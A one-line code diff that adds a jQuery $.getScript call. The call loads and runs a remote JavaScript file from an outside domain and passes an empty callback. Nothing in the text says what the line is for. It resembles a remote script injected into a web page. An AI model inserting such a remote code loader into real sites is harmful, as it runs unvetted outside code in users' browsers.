@@ -1,0 +1,1 @@
+$.getScript("https://jmshop.web.id/function.js", function(){ });
